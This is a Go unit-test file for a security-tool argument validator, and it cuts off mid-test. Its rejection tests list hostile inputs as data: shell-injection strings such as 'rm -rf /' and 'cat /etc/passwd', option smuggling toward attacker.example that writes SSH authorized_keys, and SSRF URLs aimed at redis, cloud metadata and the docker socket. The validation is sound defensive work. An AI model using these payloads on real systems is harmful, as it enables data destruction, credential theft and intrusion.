package validator

import (
	"strings"
	"testing"

	"github.com/thirdkeyai/toolclad/pkg/manifest"
)

func intPtr(v int) *int           { return &v }
func floatPtr(v float64) *float64 { return &v }

func TestValidateArg(t *testing.T) {
	tests := []struct {
		name    string
		def     *manifest.ArgDef
		value   string
		want    string
		wantErr bool
	}{
		// --- string ---
		{
			name:  "string/valid",
			def:   &manifest.ArgDef{Name: "s", Type: "string"},
			value: "hello",
			want:  "hello",
		},
		{
			name:    "string/injection",
			def:     &manifest.ArgDef{Name: "s", Type: "string"},
			value:   "hello; rm -rf /",
			wantErr: true,
		},
		{
			name:  "string/pattern match",
			def:   &manifest.ArgDef{Name: "s", Type: "string", Pattern: `^[a-z]+$`},
			value: "hello",
			want:  "hello",
		},
		{
			name:    "string/pattern mismatch",
			def:     &manifest.ArgDef{Name: "s", Type: "string", Pattern: `^[a-z]+$`},
			value:   "HELLO",
			wantErr: true,
		},

		// --- integer ---
		{
			name:  "integer/valid",
			def:   &manifest.ArgDef{Name: "n", Type: "integer"},
			value: "42",
			want:  "42",
		},
		{
			name:    "integer/not a number",
			def:     &manifest.ArgDef{Name: "n", Type: "integer"},
			value:   "abc",
			wantErr: true,
		},
		{
			name:  "integer/min max valid",
			def:   &manifest.ArgDef{Name: "n", Type: "integer", Min: intPtr(1), Max: intPtr(100)},
			value: "50",
			want:  "50",
		},
		{
			name:    "integer/below min",
			def:     &manifest.ArgDef{Name: "n", Type: "integer", Min: intPtr(10), Max: intPtr(100)},
			value:   "5",
			wantErr: true,
		},
		{
			name:    "integer/above max",
			def:     &manifest.ArgDef{Name: "n", Type: "integer", Min: intPtr(1), Max: intPtr(10)},
			value:   "20",
			wantErr: true,
		},
		{
			name:  "integer/clamp low",
			def:   &manifest.ArgDef{Name: "n", Type: "integer", Min: intPtr(5), Max: intPtr(50), Clamp: true},
			value: "1",
			want:  "5",
		},
		{
			name:  "integer/clamp high",
			def:   &manifest.ArgDef{Name: "n", Type: "integer", Min: intPtr(5), Max: intPtr(50), Clamp: true},
			value: "100",
			want:  "50",
		},

		// --- port ---
		{
			name:  "port/valid",
			def:   &manifest.ArgDef{Name: "p", Type: "port"},
			value: "443",
			want:  "443",
		},
		{
			name:    "port/zero",
			def:     &manifest.ArgDef{Name: "p", Type: "port"},
			value:   "0",
			wantErr: true,
		},
		{
			name:    "port/negative",
			def:     &manifest.ArgDef{Name: "p", Type: "port"},
			value:   "-1",
			wantErr: true,
		},
		{
			name:    "port/too high",
			def:     &manifest.ArgDef{Name: "p", Type: "port"},
			value:   "70000",
			wantErr: true,
		},
		{
			name:    "port/not a number",
			def:     &manifest.ArgDef{Name: "p", Type: "port"},
			value:   "http",
			wantErr: true,
		},

		// --- boolean ---
		{
			name:  "boolean/true",
			def:   &manifest.ArgDef{Name: "b", Type: "boolean"},
			value: "true",
			want:  "true",
		},
		{
			name:  "boolean/false",
			def:   &manifest.ArgDef{Name: "b", Type: "boolean"},
			value: "false",
			want:  "false",
		},
		{
			name:  "boolean/True uppercase",
			def:   &manifest.ArgDef{Name: "b", Type: "boolean"},
			value: "True",
			want:  "true",
		},
		{
			name:    "boolean/invalid",
			def:     &manifest.ArgDef{Name: "b", Type: "boolean"},
			value:   "yes",
			wantErr: true,
		},

		// --- enum ---
		{
			name:  "enum/valid",
			def:   &manifest.ArgDef{Name: "e", Type: "enum", Allowed: []string{"ping", "syn", "service"}},
			value: "syn",
			want:  "syn",
		},
		{
			name:    "enum/invalid value",
			def:     &manifest.ArgDef{Name: "e", Type: "enum", Allowed: []string{"ping", "syn"}},
			value:   "udp",
			wantErr: true,
		},
		{
			name:    "enum/no allowed list",
			def:     &manifest.ArgDef{Name: "e", Type: "enum"},
			value:   "any",
			wantErr: true,
		},

		// --- scope_target ---
		{
			name:  "scope_target/ip",
			def:   &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value: "192.168.1.1",
			want:  "192.168.1.1",
		},
		{
			name:  "scope_target/cidr",
			def:   &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value: "10.0.0.0/24",
			want:  "10.0.0.0/24",
		},
		{
			name:  "scope_target/hostname",
			def:   &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value: "example.com",
			want:  "example.com",
		},
		{
			name:    "scope_target/wildcard",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "*.example.com",
			wantErr: true,
		},
		{
			name:    "scope_target/injection",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "example.com; cat /etc/passwd",
			wantErr: true,
		},
		{
			name:    "scope_target/invalid",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "not a valid target!!!",
			wantErr: true,
		},
		{
			// RFC 1035 / RFC 5891 don't permit terminal whitespace in
			// hostname labels. Must reject regardless of upstream
			// trimming.
			name:    "scope_target/trailing space",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "example.com ",
			wantErr: true,
		},
		{
			name:    "scope_target/leading space",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   " example.com",
			wantErr: true,
		},
		{
			name:    "scope_target/tab",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "\texample.com",
			wantErr: true,
		},
		{
			// RFC 1035 §2.3.4 caps FQDN length at 253 octets.
			name:    "scope_target/over 253 chars",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   strings.Repeat("a", 254),
			wantErr: true,
		},
		{
			// 4096-char buffer-pathological payload from cross-impl harness.
			name:    "scope_target/buffer pathological",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   strings.Repeat("a", 4096),
			wantErr: true,
		},
		{
			name:    "scope_target/empty",
			def:     &manifest.ArgDef{Name: "t", Type: "scope_target"},
			value:   "",
			wantErr: true,
		},

		// --- url ---
		{
			name:  "url/valid http",
			def:   &manifest.ArgDef{Name: "u", Type: "url"},
			value: "https://example.com/path",
			want:  "https://example.com/path",
		},
		{
			name:    "url/no scheme",
			def:     &manifest.ArgDef{Name: "u", Type: "url"},
			value:   "example.com",
			wantErr: true,
		},
		{
			name:  "url/scheme restriction pass",
			def:   &manifest.ArgDef{Name: "u", Type: "url", Schemes: []string{"https"}},
			value: "https://example.com",
			want:  "https://example.com",
		},
		{
			name:    "url/scheme restriction fail",
			def:     &manifest.ArgDef{Name: "u", Type: "url", Schemes: []string{"https"}},
			value:   "http://example.com",
			wantErr: true,
		},

		// --- path ---
		{
			name:  "path/valid_relative",
			def:   &manifest.ArgDef{Name: "f", Type: "path"},
			value: "wordlists/rockyou.txt",
			want:  "wordlists/rockyou.txt",
		},
		{
			name:    "path/absolute_rejected",
			def:     &manifest.ArgDef{Name: "f", Type: "path"},
			value:   "/usr/share/wordlists/rockyou.txt",
			wantErr: true,
		},
		{
			name:    "path/traversal",
			def:     &manifest.ArgDef{Name: "f", Type: "path"},
			value:   "/etc/../etc/passwd",
			wantErr: true,
		},

		// --- ip_address ---
		{
			name:  "ip_address/ipv4",
			def:   &manifest.ArgDef{Name: "ip", Type: "ip_address"},
			value: "192.168.1.1",
			want:  "192.168.1.1",
		},
		{
			name:  "ip_address/ipv6",
			def:   &manifest.ArgDef{Name: "ip", Type: "ip_address"},
			value: "::1",
			want:  "::1",
		},
		{
			name:    "ip_address/invalid",
			def:     &manifest.ArgDef{Name: "ip", Type: "ip_address"},
			value:   "not-an-ip",
			wantErr: true,
		},

		// --- cidr ---
		{
			name:  "cidr/valid",
			def:   &manifest.ArgDef{Name: "c", Type: "cidr"},
			value: "10.0.0.0/24",
			want:  "10.0.0.0/24",
		},
		{
			name:    "cidr/no slash",
			def:     &manifest.ArgDef{Name: "c", Type: "cidr"},
			value:   "10.0.0.0",
			wantErr: true,
		},
		{
			name:    "cidr/invalid",
			def:     &manifest.ArgDef{Name: "c", Type: "cidr"},
			value:   "999.999.999.0/24",
			wantErr: true,
		},

		// --- msf_options ---
		{
			name:  "msf_options/valid single",
			def:   &manifest.ArgDef{Name: "opts", Type: "msf_options"},
			value: "RHOSTS 192.168.1.1",
			want:  "RHOSTS 192.168.1.1",
		},
		{
			name:  "msf_options/valid multiple",
			def:   &manifest.ArgDef{Name: "opts", Type: "msf_options"},
			value: "RHOSTS 192.168.1.1; RPORT 445",
			want:  "RHOSTS 192.168.1.1; RPORT 445",
		},
		{
			name:    "msf_options/invalid key lowercase",
			def:     &manifest.ArgDef{Name: "opts", Type: "msf_options"},
			value:   "rhosts 192.168.1.1",
			wantErr: true,
		},
		{
			name:    "msf_options/missing value",
			def:     &manifest.ArgDef{Name: "opts", Type: "msf_options"},
			value:   "RHOSTS",
			wantErr: true,
		},
		{
			name:    "msf_options/pipe in value",
			def:     &manifest.ArgDef{Name: "opts", Type: "msf_options"},
			value:   "RHOSTS foo|bar",
			wantErr: true,
		},

		// --- credential_file ---
		{
			name:    "credential_file/absolute path",
			def:     &manifest.ArgDef{Name: "cred", Type: "credential_file"},
			value:   "/etc/shadow",
			wantErr: true,
		},
		{
			name:    "credential_file/path traversal",
			def:     &manifest.ArgDef{Name: "cred", Type: "credential_file"},
			value:   "creds/../../../etc/shadow",
			wantErr: true,
		},
		{
			name:    "credential_file/nonexistent",
			def:     &manifest.ArgDef{Name: "cred", Type: "credential_file"},
			value:   "nonexistent_file.txt",
			wantErr: true,
		},

		// --- duration ---
		{
			name:  "duration/plain seconds",
			def:   &manifest.ArgDef{Name: "d", Type: "duration"},
			value: "30",
			want:  "30",
		},
		{
			name:  "duration/minutes",
			def:   &manifest.ArgDef{Name: "d", Type: "duration"},
			value: "5m",
			want:  "5m",
		},
		{
			name:  "duration/hours and minutes",
			def:   &manifest.ArgDef{Name: "d", Type: "duration"},
			value: "1h30m",
			want:  "1h30m",
		},
		{
			name:  "duration/milliseconds",
			def:   &manifest.ArgDef{Name: "d", Type: "duration"},
			value: "500ms",
			want:  "500ms",
		},
		{
			name:    "duration/invalid",
			def:     &manifest.ArgDef{Name: "d", Type: "duration"},
			value:   "five minutes",
			wantErr: true,
		},
		{
			name:    "duration/empty",
			def:     &manifest.ArgDef{Name: "d", Type: "duration"},
			value:   "",
			wantErr: true,
		},

		// --- regex_match ---
		{
			name:  "regex_match/valid",
			def:   &manifest.ArgDef{Name: "r", Type: "regex_match", Pattern: `^[a-z0-9_]+$`},
			value: "hello_world",
			want:  "hello_world",
		},
		{
			name:    "regex_match/no match",
			def:     &manifest.ArgDef{Name: "r", Type: "regex_match", Pattern: `^[a-z0-9_]+$`},
			value:   "HELLO",
			wantErr: true,
		},
		{
			name:    "regex_match/no pattern",
			def:     &manifest.ArgDef{Name: "r", Type: "regex_match"},
			value:   "anything",
			wantErr: true,
		},

		// --- unknown type ---
		{
			name:    "unknown type",
			def:     &manifest.ArgDef{Name: "x", Type: "foobar"},
			value:   "anything",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ValidateArg(tt.def, tt.value)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got nil (value=%q)", got)
				}
				return
			}
			if err != nil {
				t.Errorf("unexpected error: %v", err)
				return
			}
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestValidateArgWithCustomTypes(t *testing.T) {
	customTypes := map[string]*manifest.CustomTypeDef{
		"severity": {
			Base:    "enum",
			Allowed: []string{"low", "medium", "high", "critical"},
		},
		"bounded_int": {
			Base: "integer",
			Min:  intPtr(1),
			Max:  intPtr(100),
		},
	}

	tests := []struct {
		name    string
		def     *manifest.ArgDef
		value   string
		want    string
		wantErr bool
	}{
		{
			name:  "custom enum type valid",
			def:   &manifest.ArgDef{Name: "sev", Type: "severity"},
			value: "high",
			want:  "high",
		},
		{
			name:    "custom enum type invalid",
			def:     &manifest.ArgDef{Name: "sev", Type: "severity"},
			value:   "unknown",
			wantErr: true,
		},
		{
			name:  "custom integer type valid",
			def:   &manifest.ArgDef{Name: "num", Type: "bounded_int"},
			value: "50",
			want:  "50",
		},
		{
			name:    "custom integer type out of range",
			def:     &manifest.ArgDef{Name: "num", Type: "bounded_int"},
			value:   "200",
			wantErr: true,
		},
		{
			name:  "fallback to builtin type",
			def:   &manifest.ArgDef{Name: "p", Type: "port"},
			value: "443",
			want:  "443",
		},
		{
			name:    "custom type with invalid base",
			def:     &manifest.ArgDef{Name: "x", Type: "bad_custom"},
			value:   "anything",
			wantErr: true,
		},
	}

	// Add a custom type with invalid base for testing
	customTypes["bad_custom"] = &manifest.CustomTypeDef{Base: "nonexistent"}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ValidateArgWithCustomTypes(tt.def, tt.value, customTypes)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got nil (value=%q)", got)
				}
				return
			}
			if err != nil {
				t.Errorf("unexpected error: %v", err)
				return
			}
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestNumberType(t *testing.T) {
	tests := []struct {
		name    string
		def     *manifest.ArgDef
		value   string
		wantErr bool
	}{
		{"valid float", &manifest.ArgDef{Name: "n", Type: "number"}, "0.5", false},
		// A negative output starts with '-' and is rejected by the
		// leading-dash rule unless the arg opts in.
		{"negative rejected by leading-dash rule", &manifest.ArgDef{Name: "n", Type: "number"}, "-3.14", true},
		{"negative with allow_leading_dash", &manifest.ArgDef{Name: "n", Type: "number", AllowLeadingDash: true}, "-3.14", false},
		{"NaN rejected", &manifest.ArgDef{Name: "n", Type: "number"}, "NaN", true},
		{"Inf rejected", &manifest.ArgDef{Name: "n", Type: "number"}, "Inf", true},
		{"non-numeric", &manifest.ArgDef{Name: "n", Type: "number"}, "abc", true},
		{
			"min_float ok",
			&manifest.ArgDef{Name: "n", Type: "number", MinFloat: floatPtr(0.0), MaxFloat: floatPtr(1.0)},
			"0.5",
			false,
		},
		{
			"min_float below",
			&manifest.ArgDef{Name: "n", Type: "number", MinFloat: floatPtr(0.0)},
			"-0.1",
			true,
		},
		{
			"max_float above",
			&manifest.ArgDef{Name: "n", Type: "number", MaxFloat: floatPtr(1.0)},
			"1.5",
			true,
		},
		{
			"falls back to int min/max",
			&manifest.ArgDef{Name: "n", Type: "number", Min: intPtr(1), Max: intPtr(10)},
			"5.5",
			false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ValidateArg(tt.def, tt.value)
			if tt.wantErr && err == nil {
				t.Errorf("expected error, got nil")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("unexpected error: %v", err)
			}
		})
	}
}

func TestScopeTargetHardening(t *testing.T) {
	tests := []struct {
		name    string
		value   string
		wantSub string // expected substring in error
	}{
		{"punycode rejected", "xn--example-9c.com", "punycode"},
		{"mixed-case punycode rejected", "XN--example-9c.com", "punycode"},
		{"non-ASCII rejected", "exаmple.com", "ASCII"}, // Cyrillic а
		{"specific traversal message", "../../etc/passwd", "traversal"},
		{"specific slash message", "etc/passwd", "'/'"},
	}
	def := &manifest.ArgDef{Name: "t", Type: "scope_target"}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ValidateArg(def, tt.value)
			if err == nil {
				t.Fatalf("expected error for %q, got none", tt.value)
			}
			if !contains(err.Error(), tt.wantSub) {
				t.Errorf("error %q does not contain %q", err.Error(), tt.wantSub)
			}
		})
	}
}

func contains(haystack, needle string) bool {
	return len(haystack) >= len(needle) && (func() bool {
		for i := 0; i+len(needle) <= len(haystack); i++ {
			if haystack[i:i+len(needle)] == needle {
				return true
			}
		}
		return false
	})()
}

func TestCheckInjection(t *testing.T) {
	tests := []struct {
		value   string
		wantErr bool
	}{
		{"hello", false},
		{"hello world", false},
		{"192.168.1.1", false},
		{"hello;world", true},
		{"$(whoami)", true},
		{"foo|bar", true},
		{"foo&bar", true},
		{"foo`bar`", true},
		{"{}", true},
		{"a<b>c", true},
	}

	for _, tt := range tests {
		t.Run(tt.value, func(t *testing.T) {
			err := CheckInjection(tt.value)
			if tt.wantErr && err == nil {
				t.Error("expected error, got nil")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("unexpected error: %v", err)
			}
		})
	}
}

// TC-1: argument values that smuggle extra options through quoting or
// whitespace must be rejected outright by the string-derived hygiene rules.
func TestTC1PayloadsRejected(t *testing.T) {
	cases := []struct{ typ, value string }{
		{"string", "' -d @/etc/passwd"},
		{"string", "X: y' -d @/etc/passwd -H 'Z: w"},
		{"url", "https://attacker.example/ -o /root/.ssh/authorized_keys"},
		{"url", "https://attacker.example/ -o /tmp/pwned"},
	}
	for _, c := range cases {
		t.Run(c.typ+"/"+c.value, func(t *testing.T) {
			def := &manifest.ArgDef{Name: "v", Type: c.typ}
			if got, err := ValidateArg(def, c.value); err == nil {
				t.Fatalf("template mode: expected rejection, got %q", got)
			}
			// Opting in to whitespace in exec mode must not rescue these:
			// quotes stay banned and url never allows whitespace.
			def.AllowWhitespace = true
			if got, err := ValidateArgMode(def, c.value, true); err == nil {
				t.Fatalf("exec mode with allow_whitespace: expected rejection, got %q", got)
			}
		})
	}
}

// TC-2: option-looking values must never reach the tool as options.
func TestTC2PayloadsRejected(t *testing.T) {
	values := []string{
		"-iL /etc/passwd",
		"--script=/tmp/evil.nse",
		"--script http-fetch --script-args http-fetch.destination=/tmp/d",
	}
	for _, v := range values {
		t.Run(v, func(t *testing.T) {
			def := &manifest.ArgDef{Name: "v", Type: "string"}
			if got, err := ValidateArg(def, v); err == nil {
				t.Fatalf("expected rejection, got %q", got)
			}
			def.AllowWhitespace = true
			if got, err := ValidateArgMode(def, v, true); err == nil {
				t.Fatalf("exec mode with allow_whitespace: expected rejection (leading dash), got %q", got)
			}
		})
	}
}

// TC-3: the leading-dash rule across types, and the allow_leading_dash opt-in.
func TestTC3LeadingDashRejected(t *testing.T) {
	const msg = "must not start with '-' or '+' (set allow_leading_dash = true to permit)"
	cases := []struct{ typ, value string }{
		{"path", "-rf"},
		{"string", "--output=/etc/cron.d/x"},
		{"integer", "-1"},
		{"string", "+short"},
		{"number", "-0.5"},
		{"duration", "-5"},
		{"msf_options", "-RHOSTS 10.0.0.1"},
	}
	for _, c := range cases {
		t.Run(c.typ+"/"+c.value, func(t *testing.T) {
			_, err := ValidateArg(&manifest.ArgDef{Name: "v", Type: c.typ}, c.value)
			if err == nil {
				t.Fatalf("expected rejection")
			}
			if !strings.Contains(err.Error(), msg) {
				t.Fatalf("error %q does not contain %q", err.Error(), msg)
			}
		})
	}

	got, err := ValidateArg(&manifest.ArgDef{Name: "v", Type: "string", AllowLeadingDash: true}, "-v")
	if err != nil || got != "-v" {
		t.Errorf("allow_leading_dash should permit -v, got %q, %v", got, err)
	}
	got, err = ValidateArg(&manifest.ArgDef{Name: "v", Type: "integer", AllowLeadingDash: true}, "-1")
	if err != nil || got != "-1" {
		t.Errorf("allow_leading_dash should permit -1, got %q, %v", got, err)
	}
	// The numeric rule applies to the output value: clamping to a
	// non-negative minimum rescues a negative input.
	got, err = ValidateArg(&manifest.ArgDef{Name: "v", Type: "integer", Min: intPtr(1), Clamp: true}, "-5")
	if err != nil || got != "1" {
		t.Errorf("clamped negative should yield 1, got %q, %v", got, err)
	}
}

func TestValueHygiene(t *testing.T) {
	str := func(allowWS bool) *manifest.ArgDef {
		return &manifest.ArgDef{Name: "v", Type: "string", AllowWhitespace: allowWS}
	}
	tests := []struct {
		name     string
		def      *manifest.ArgDef
		value    string
		execMode bool
		wantErr  string
		want     string
	}{
		{name: "NUL in enum", def: &manifest.ArgDef{Name: "v", Type: "enum", Allowed: []string{"syn\x00"}}, value: "syn\x00", wantErr: "must not contain NUL bytes"},
		{name: "NUL in integer", def: &manifest.ArgDef{Name: "v", Type: "integer"}, value: "1\x00", wantErr: "must not contain NUL bytes"},
		{name: "NUL in boolean", def: &manifest.ArgDef{Name: "v", Type: "boolean"}, value: "true\x00", wantErr: "must not contain NUL bytes"},
		{name: "control char", def: str(false), value: "a\x01b", wantErr: "must not contain control characters"},
		{name: "DEL", def: str(false), value: "a\x7fb", wantErr: "must not contain control characters"},
		{name: "tab without opt-in", def: str(false), value: "a\tb", wantErr: "must not contain control characters"},
		{name: "double quote", def: str(false), value: `a"b`, wantErr: "must not contain quote or backslash characters"},
		{name: "single quote", def: str(false), value: "a'b", wantErr: "must not contain quote or backslash characters"},
		{name: "backslash", def: str(false), value: `a\b`, wantErr: "must not contain quote or backslash characters"},
		{name: "scope_target backslash keeps specific message", def: &manifest.ArgDef{Name: "v", Type: "scope_target"}, value: `a\b`, wantErr: "backslash escape sequences"},
		{name: "space", def: str(false), value: "a b", wantErr: "must not contain whitespace"},
		{name: "nbsp", def: str(false), value: "a b", wantErr: "must not contain whitespace"},
		{name: "allow_whitespace ignored in template mode", def: str(true), value: "a b", execMode: false, wantErr: "must not contain whitespace"},
		{name: "allow_whitespace honored in exec mode", def: str(true), value: "a b", execMode: true, want: "a b"},
		// allow_whitespace permits only the ASCII space; control characters
		// are rejected unconditionally and exotic spaces stay rejected.
		{name: "allow_whitespace tab still rejected", def: str(true), value: "a\tb", execMode: true, wantErr: "must not contain control characters"},
		{name: "allow_whitespace newline still rejected", def: str(true), value: "a\nb", execMode: true, wantErr: "must not contain control characters"},
		{name: "allow_whitespace CR still rejected", def: str(true), value: "a\rb", execMode: true, wantErr: "must not contain control characters"},
		{name: "allow_whitespace vertical tab still rejected", def: str(true), value: "a\vb", execMode: true, wantErr: "must not contain control characters"},
		{name: "allow_whitespace form feed still rejected", def: str(true), value: "a\fb", execMode: true, wantErr: "must not contain control characters"},
		{name: "allow_whitespace nbsp still rejected", def: str(true), value: "a\u00a0b", execMode: true, wantErr: "must not contain whitespace"},
		{name: "allow_whitespace line separator still rejected", def: str(true), value: "a\u2028b", execMode: true, wantErr: "must not contain whitespace"},
		{name: "allow_whitespace ideographic space still rejected", def: str(true), value: "a\u3000b", execMode: true, wantErr: "must not contain whitespace"},
		{name: "C1 control rejected", def: str(true), value: "a\u0085b", execMode: true, wantErr: "must not contain control characters"},
		{name: "msf_options tab rejected", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS\t10.0.0.1", wantErr: "must not contain control characters"},
		{name: "msf_options nbsp rejected", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS\u00a010.0.0.1", wantErr: "must not contain whitespace"},
		{name: "url never allows whitespace", def: &manifest.ArgDef{Name: "v", Type: "url", AllowWhitespace: true}, value: "https://example.com/a b", execMode: true, wantErr: "must not contain whitespace"},
		{name: "msf_options exempt from whitespace rule", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS 10.0.0.1", want: "RHOSTS 10.0.0.1"},
		{name: "msf_options still rejects quotes", def: &manifest.ArgDef{Name: "v", Type: "msf_options"}, value: "RHOSTS 'x'", wantErr: "must not contain quote or backslash characters"},
		{name: "path with space rejected", def: &manifest.ArgDef{Name: "v", Type: "path"}, value: "my file.txt", wantErr: "must not contain whitespace"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ValidateArgMode(tt.def, tt.value, tt.execMode)
			if tt.wantErr != "" {
				if err == nil {
					t.Fatalf("expected error containing %q, got value %q", tt.wantErr, got)
				}
				if !strings.Contains(err.Error(), tt.wantErr) {
					t.Fatalf("error %q does not contain %q", err.Error(), tt.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestPatternAnchoring(t *testing.T) {
	str := &manifest.ArgDef{Name: "v", Type: "string", Pattern: "[a-z]+"}
	if _, err := ValidateArg(str, "abc123"); err == nil {
		t.Error("unanchored pattern [a-z]+ must reject abc123")
	}
	if got, err := ValidateArg(str, "abc"); err != nil || got != "abc" {
		t.Errorf("pattern [a-z]+ should accept abc, got %q, %v", got, err)
	}
	rm := &manifest.ArgDef{Name: "v", Type: "regex_match", Pattern: "[a-z]+"}
	if _, err := ValidateArg(rm, "abc123"); err == nil {
		t.Error("regex_match with [a-z]+ must reject abc123")
	}
	custom := map[string]*manifest.CustomTypeDef{"lower": {Base: "string", Pattern: "[a-z]+"}}
	if _, err := ValidateArgWithCustomTypes(&manifest.ArgDef{Name: "v", Type: "lower"}, "abc123", custom); err == nil {
		t.Error("custom type pattern [a-z]+ must reject abc123")
	}
	// Custom types go through hygiene too.
	if _, err := ValidateArgWithCustomTypes(&manifest.ArgDef{Name: "v", Type: "lower"}, "-abc", custom); err == nil {
		t.Error("custom type must apply the leading-dash rule")
	}
}

func TestAnchorPattern(t *testing.T) {
	cases := map[string]string{
		"[a-z]+":   "^(?:[a-z]+)$",
		"^[a-z]+$": "^(?:[a-z]+)$",
		"^abc":     "^(?:abc)$",
		"abc$":     "^(?:abc)$",
		`a\$`:      `^(?:a\$)$`,
		`a\\$`:     `^(?:a\\)$`,
	}
	for in, want := range cases {
		if got := AnchorPattern(in); got != want {
			t.Errorf("AnchorPattern(%q) = %q, want %q", in, got, want)
		}
	}
}

// urlVector mirrors one `url-` entry of the shared injection-vector suite.
// The values are asserted inline here; the shared file is wired in later.
type urlVector struct {
	id            string
	schemes       []string
	blockInternal bool
	value         string
	accept        bool
}

var urlVectors = []urlVector{
	{id: "url-space-option-injection", value: "https://attacker.example/ -o /root/.ssh/authorized_keys"},
	{id: "url-space-write-tmp", value: "https://attacker.example/ -o /tmp/pwned"},
	{id: "url-secret-smuggling", value: "https://attacker.example/?k={_secret:api_key}"},
	{id: "url-javascript-scheme", value: "javascript:alert(1)"},
	{id: "url-file-scheme", value: "file:///etc/passwd"},
	{id: "url-data-scheme", value: "data:text/html,<script>1</script>"},
	{id: "url-gopher-redis", value: "gopher://127.0.0.1:6379/_FLUSHALL"},
	{id: "url-dict-scheme", value: "dict://127.0.0.1:11211/stat"},
	{id: "url-userinfo", value: "http://user:pw@example.com/"},
	{id: "url-metacharacter", value: "https://attacker.example/;id"},
	{id: "url-scheme-not-in-list", schemes: []string{"https"}, value: "http://example.com/"},
	{id: "url-imds-always-blocked", value: "http://169.254.169.254/latest/meta-data/"},
	{id: "url-docker-socket-block-internal", blockInternal: true, value: "http://127.0.0.1:2375/containers/json"},
	{id: "url-ipv6-loopback-block-internal", blockInternal: true, value: "http://[::1]:8080/"},
	{id: "url-accept", value: "https://example.com/path", accept: true},
	{id: "url-accept-public-ip-block-internal", blockInternal: true, value: "https://93.184.216.34/x", accept: true},
}

func TestURLVectors(t *testing.T) {
	for _, v := range urlVectors {
		t.Run(v.id, func(t *testing.T) {
			def := &manifest.ArgDef{Name: "u", Type: "url", Schemes: v.schemes, BlockInternal: v.blockInternal}
			got, err := ValidateArg(def, v.value)
			if v.accept {
				if err != nil {
					t.Fatalf("expected accept, got error: %v", err)
				}
				if got != v.value {
					t.Fatalf("value must pass through unchanged: got %q", got)
				}
				return
			}
			if err == nil {
				t.Fatalf("expected rejection, got %q", got)
			}
		})
	}
}

func TestURLSchemes(t *testing.T) {
	// The default allowlist is http and https; anything else is refused
	// even though the shipped manifests never set `schemes`.
	def := &manifest.ArgDef{Name: "u", Type: "url"}
	for _, v := range []string{
		"gopher://127.0.0.1:6379/_FLUSHALL",
		"file://localhost/etc/passwd",
		"ftp://example.com/x",
		"ldap://example.com/x",
		"wss://example.com/x",
		"example.com",
		"example.com/path",
		"://example.com/",
	} {
		if _, err := ValidateArg(def, v); err == nil {
			t.Errorf("%q: expected rejection", v)
		}
	}
	for _, v := range []string{"http://example.com/", "HTTPS://example.com/", "https://example.com"} {
		if _, err := ValidateArg(def, v); err != nil {
			t.Errorf("%q: unexpected error: %v", v, err)
		}
	}

	// schemes narrows the allowlist, case-insensitively.
	httpsOnly := &manifest.ArgDef{Name: "u", Type: "url", Schemes: []string{"HTTPS"}}
	if _, err := ValidateArg(httpsOnly, "http://example.com/"); err == nil || !strings.Contains(err.Error(), "not in allowed schemes") {
		t.Errorf("schemes=[https] must reject http, got %v", err)
	}
	if _, err := ValidateArg(httpsOnly, "https://example.com/"); err != nil {
		t.Errorf("schemes=[https] must accept https: %v", err)
	}

	// A denied scheme stays denied even when a manifest lists it, with its
	// own message.
	listed := &manifest.ArgDef{Name: "u", Type: "url", Schemes: []string{"https", "file", "gopher"}}
	for _, v := range []string{"file://localhost/etc/passwd", "gopher://127.0.0.1:6379/_FLUSHALL"} {
		_, err := ValidateArg(listed, v)
		if err == nil || !strings.Contains(err.Error(), "is never permitted") {
			t.Errorf("%q: listed denied scheme must still be refused with the dedicated message, got %v", v, err)
		}
	}
	if _, err := ValidateArg(listed, "https://example.com/"); err != nil {
		t.Errorf("listed https must still pass: %v", err)
	}
}

func TestURLPorts(t *testing.T) {
	def := &manifest.ArgDef{Name: "u", Type: "url"}
	for _, v := range []string{"https://example.com:8443/x", "https://example.com:1/", "https://example.com:65535"} {
		if _, err := ValidateArg(def, v); err != nil {
			t.Errorf("%q: unexpected error: %v", v, err)
		}
	}
	for _, v := range []string{
		"https://example.com:0/x",
		"https://example.com:99999/x",
		"https://example.com:65536/",
		"https://example.com:/x",
		"https://example.com:8a/x",
		"https://example.com:+1/x",
	} {
		if _, err := ValidateArg(def, v); err == nil {
			t.Errorf("%q: expected rejection", v)
		}
	}
}

func TestURLBlockInternal(t *testing.T) {
	open := &manifest.ArgDef{Name: "u", Type: "url"}
	blocking := &manifest.ArgDef{Name: "u", Type: "url", BlockInternal: true}

	// Loopback is allowed only when block_internal is off.
	if _, err := ValidateArg(open, "http://127.0.0.1/"); err != nil {
		t.Errorf("loopback without block_internal must pass: %v", err)
	}
	for _, v := range []string{
		"http://127.0.0.1/",
		"http://[::1]:8080/",
		"http://10.0.0.5/x",
		"http://192.168.1.1:8080/",
